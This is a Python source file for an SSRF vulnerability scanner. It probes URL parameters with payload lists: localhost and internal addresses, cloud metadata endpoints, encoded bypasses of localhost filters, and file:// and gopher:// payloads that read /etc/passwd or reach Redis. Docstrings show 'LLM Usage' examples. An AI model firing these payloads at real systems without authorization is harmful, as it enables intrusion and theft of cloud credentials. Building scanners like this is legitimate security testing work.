"""
SSRF Scanner for VulnHunter
Detects Server-Side Request Forgery vulnerabilities
"""

import re
from typing import Optional, Dict, List, Any
from datetime import datetime
from loguru import logger

from .base_scanner import BaseScanner, ScanResult, Vulnerability
from ..core.http_client import HTTPClient, HTTPRequest, HTTPResponse


class SSRFScanner(BaseScanner):
    """
    SSRF (Server-Side Request Forgery) vulnerability scanner
    Detects SSRF vulnerabilities that allow internal network access
    """
    
    def __init__(self, http_client: HTTPClient,
                 callback_url: Optional[str] = None):
        super().__init__(http_client)
        self.name = "SSRF Scanner"
        self.category = "ssrf"
        
        # External callback URL for out-of-band detection
        self.callback_url = callback_url
        
        # URL parameter patterns
        self.url_param_names = [
            'url', 'uri', 'path', 'dest', 'redirect', 'return',
            'next', 'site', 'html', 'val', 'validate', 'domain',
            'callback', 'return_to', 'return_url', 'go', 'forward',
            'file', 'document', 'folder', 'load', 'retrieve',
            'fetch', 'page', 'proxy', 'webhook', 'image', 'img',
            'src', 'source', 'href', 'link', 'target', 'remote',
        ]
        
        # Internal targets to test
        self.internal_targets = [
            # Localhost
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            
            # Internal networks
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://169.254.169.254/computeMetadata/v1/",  # GCP
            "http://100.100.100.200/latest/meta-data/",  # Alibaba
            
            # Common internal services
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3000",
            "http://127.0.0.1:6379",  # Redis
            "http://127.0.0.1:11211",  # Memcached
            "http://127.0.0.1:9200",  # Elasticsearch
        ]
        
        # Bypass payloads
        self.bypass_payloads = [
            # IP variations
            "http://0.0.0.0",
            "http://0",
            "http://127.1",
            "http://127.0.1",
            
            # IPv6
            "http://[0:0:0:0:0:0:0:1]",
            "http://[::ffff:127.0.0.1]",
            
            # Decimal IP
            "http://2130706433",  # 127.0.0.1 in decimal
            
            # Octal IP
            "http://0177.0.0.1",
            
            # Hex IP
            "http://0x7f.0x0.0x0.0x1",
            "http://0x7f000001",
            
            # URL encoding
            "http://127.0.0.1%00",
            "http://127.0.0.1%23",
            
            # Domain redirection
            "http://localhost.localdomain",
            "http://spoofed.burpcollaborator.net",
        ]
        
        # Protocol variations
        self.protocol_payloads = [
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://127.0.0.1:11211/info",
            "gopher://127.0.0.1:6379/_INFO",
            "ftp://127.0.0.1/",
        ]
        
    def scan_url(self, url: str, method: str = "GET",
                params: Optional[Dict] = None) -> ScanResult:
        """
        Scan a URL for SSRF vulnerabilities
        
        LLM Usage:
            scanner = SSRFScanner(http_client)
            results = scanner.scan_url("/fetch", "GET", {"url": "https://example.com"})
        """
        self.results = ScanResult(
            scanner_name=self.name,
            target_url=url,
            start_time=datetime.now()
        )
        
        if not params:
            logger.warning("No parameters to test for SSRF")
            self.results.end_time = datetime.now()
            return self.results
        
        # Find URL parameters
        for param_name, param_value in params.items():
            if self._is_url_parameter(param_name, param_value):
                self._test_parameter(url, method, params, param_name)
        
        self.results.end_time = datetime.now()
        return self.results
    
    def scan_form(self, action: str, method: str,
                 inputs: List[Dict]) -> ScanResult:
        """Scan a form for SSRF vulnerabilities"""
        self.results = ScanResult(
            scanner_name=self.name,
            target_url=action,
            start_time=datetime.now()
        )
        
        form_data = {}
        url_params = []
        
        for inp in inputs:
            name = inp.get('name', '')
            value = inp.get('value', '')
            if name:
                form_data[name] = value
                if self._is_url_parameter(name, value):
                    url_params.append(name)
        
        for param in url_params:
            self._test_parameter(action, method, form_data, param)
        
        self.results.end_time = datetime.now()
        return self.results
    
    def _is_url_parameter(self, name: str, value: str) -> bool:
        """Check if parameter likely accepts URLs"""
        name_lower = name.lower()
        
        # Check name against known URL parameters
        for url_param in self.url_param_names:
            if url_param in name_lower:
                return True
        
        # Check if value looks like a URL
        if value:
            if value.startswith('http://') or value.startswith('https://'):
                return True
            if re.match(r'^[\w-]+\.\w+', value):  # Looks like a domain
                return True
        
        return False
    
    def _test_parameter(self, url: str, method: str, params: Dict, param_name: str):
        """Test a parameter for SSRF"""
        
        # Get baseline with a safe external URL
        safe_url = "https://www.google.com"
        baseline_params = params.copy()
        baseline_params[param_name] = safe_url
        
        if method.upper() == "GET":
            baseline = self.http_client.get(url, params=baseline_params)
        else:
            baseline = self.http_client.post_form(url, baseline_params)
        self.results.requests_made += 1
        
        # Test internal targets
        self._test_internal_access(url, method, params, param_name, baseline)
        
        # Test cloud metadata
        self._test_cloud_metadata(url, method, params, param_name)
        
        # Test bypass techniques
        self._test_bypasses(url, method, params, param_name, baseline)
        
        # Test protocol handlers
        self._test_protocols(url, method, params, param_name)
    
    def _test_internal_access(self, url: str, method: str, params: Dict,
                             param_name: str, baseline: HTTPResponse):
        """Test for internal network access"""
        
        for target in self.internal_targets[:5]:  # Limit tests
            test_params = params.copy()
            test_params[param_name] = target
            
            if method.upper() == "GET":
                response = self.http_client.get(url, params=test_params)
            else:
                response = self.http_client.post_form(url, test_params)
            self.results.requests_made += 1
            
            if self._is_ssrf_successful(baseline, response, target):
                vuln = Vulnerability(
                    id=self._create_vuln_id("ssrf", url, param_name),
                    title=f"SSRF in Parameter '{param_name}'",
                    description=f"The parameter '{param_name}' is vulnerable to SSRF. "
                               f"The server made a request to internal target: {target}",
                    severity="critical" if "169.254" in target else "high",
                    category="ssrf",
                    url=url,
                    parameter=param_name,
                    method=method,
                    payload=target,
                    evidence=f"Internal target {target} was accessible",
                    remediation="Implement URL validation with allowlisting. Block requests "
                               "to internal networks and cloud metadata endpoints.",
                    cvss_score=9.1 if "169.254" in target else 7.5,
                    cwe_id="CWE-918",
                    confidence="high",
                )
                self.results.add_vulnerability(vuln)
                logger.info(f"[!] SSRF found: {param_name} -> {target}")
                return
    
    def _test_cloud_metadata(self, url: str, method: str, params: Dict, param_name: str):
        """Test for cloud metadata endpoint access"""
        
        metadata_endpoints = [
            ("http://169.254.169.254/latest/meta-data/", "AWS"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"),
        ]
        
        for endpoint, cloud in metadata_endpoints:
            test_params = params.copy()
            test_params[param_name] = endpoint
            
            if method.upper() == "GET":
                response = self.http_client.get(url, params=test_params)
            else:
                response = self.http_client.post_form(url, test_params)
            self.results.requests_made += 1
            
            # Check for cloud metadata indicators
            metadata_indicators = [
                "ami-id", "instance-id", "local-hostname",  # AWS
                "project/project-id", "instance/zone",  # GCP
                "compute", "vmId",  # Azure
            ]
            
            for indicator in metadata_indicators:
                if indicator in response.body.lower():
                    vuln = Vulnerability(
                        id=self._create_vuln_id("ssrf-metadata", url, param_name),
                        title=f"SSRF - Cloud Metadata Access ({cloud})",
                        description=f"Critical SSRF vulnerability allows access to {cloud} "
                                   f"cloud metadata endpoint. This can expose sensitive "
                                   f"credentials and configuration.",
                        severity="critical",
                        category="ssrf",
                        url=url,
                        parameter=param_name,
                        method=method,
                        payload=endpoint,
                        evidence=f"Cloud metadata indicator found: {indicator}",
                        remediation="Block all requests to 169.254.169.254. Use IMDSv2 for AWS.",
                        cvss_score=10.0,
                        cwe_id="CWE-918",
                        confidence="high",
                    )
                    self.results.add_vulnerability(vuln)
                    logger.info(f"[!] CRITICAL: Cloud metadata access via SSRF!")
                    return
    
    def _test_bypasses(self, url: str, method: str, params: Dict,
                      param_name: str, baseline: HTTPResponse):
        """Test SSRF bypass techniques"""
        
        for payload in self.bypass_payloads[:5]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            if method.upper() == "GET":
                response = self.http_client.get(url, params=test_params)
            else:
                response = self.http_client.post_form(url, test_params)
            self.results.requests_made += 1
            
            if self._is_ssrf_successful(baseline, response, payload):
                vuln = Vulnerability(
                    id=self._create_vuln_id("ssrf-bypass", url, param_name),
                    title=f"SSRF with Filter Bypass in '{param_name}'",
                    description=f"SSRF protection was bypassed using payload: {payload}",
                    severity="high",
                    category="ssrf",
                    url=url,
                    parameter=param_name,
                    method=method,
                    payload=payload,
                    evidence="Bypass payload successful",
                    remediation="Implement robust URL parsing and validation.",
                    cvss_score=8.0,
                    cwe_id="CWE-918",
                    confidence="medium",
                )
                self.results.add_vulnerability(vuln)
                logger.info(f"[!] SSRF bypass found with: {payload}")
                return
    
    def _test_protocols(self, url: str, method: str, params: Dict, param_name: str):
        """Test for protocol handler abuse"""
        
        for payload in self.protocol_payloads:
            test_params = params.copy()
            test_params[param_name] = payload
            
            if method.upper() == "GET":
                response = self.http_client.get(url, params=test_params)
            else:
                response = self.http_client.post_form(url, test_params)
            self.results.requests_made += 1
            
            # Check for file disclosure
            file_indicators = [
                "root:", "/bin/bash",  # Unix
                "[extensions]", "[fonts]",  # Windows
            ]
            
            for indicator in file_indicators:
                if indicator in response.body:
                    vuln = Vulnerability(
                        id=self._create_vuln_id("ssrf-protocol", url, param_name),
                        title=f"SSRF with Protocol Handler Abuse",
                        description=f"The application processes alternative URL protocols, "
                                   f"allowing file access via: {payload}",
                        severity="critical",
                        category="ssrf",
                        url=url,
                        parameter=param_name,
                        method=method,
                        payload=payload,
                        evidence=f"File content indicator: {indicator}",
                        remediation="Restrict URL schemes to http/https only.",
                        cvss_score=9.0,
                        cwe_id="CWE-918",
                        confidence="high",
                    )
                    self.results.add_vulnerability(vuln)
                    logger.info(f"[!] SSRF protocol abuse: {payload}")
                    return
    
    def _is_ssrf_successful(self, baseline: HTTPResponse,
                           test_response: HTTPResponse, payload: str) -> bool:
        """Determine if SSRF was successful"""
        
        # Error indicating blocked request (no SSRF)
        block_indicators = [
            "blocked", "denied", "forbidden", "not allowed",
            "invalid url", "malformed", "refused",
        ]
        
        for indicator in block_indicators:
            if indicator in test_response.body.lower():
                return False
        
        # Success indicators
        if test_response.status_code == 200:
            # Response has content and is different from error page
            if len(test_response.body) > 50:
                # Check if response looks like internal content
                if self._response_looks_internal(test_response):
                    return True
        
        # Connection indicators
        if "connection refused" not in test_response.body.lower():
            if test_response.elapsed_time > 2:  # Slow response might indicate network access
                return True
        
        return False
    
    def _response_looks_internal(self, response: HTTPResponse) -> bool:
        """Check if response appears to be from internal network"""
        body_lower = response.body.lower()
        
        internal_indicators = [
            "internal", "private", "localhost", "admin",
            "dashboard", "config", "settings", "database",
        ]
        
        for indicator in internal_indicators:
            if indicator in body_lower:
                return True
        
        return False
    
    def get_payloads(self, payload_type: str = "all") -> List[str]:
        """
        Get SSRF payloads for manual testing
        
        LLM Usage:
            payloads = scanner.get_payloads("internal")  # internal, metadata, bypass, protocol, all
        """
        if payload_type == "internal":
            return self.internal_targets
        elif payload_type == "bypass":
            return self.bypass_payloads
        elif payload_type == "protocol":
            return self.protocol_payloads
        elif payload_type == "metadata":
            return [t for t in self.internal_targets if "169.254" in t]
        else:
            all_payloads = self.internal_targets.copy()
            all_payloads.extend(self.bypass_payloads)
            all_payloads.extend(self.protocol_payloads)
            return all_payloads
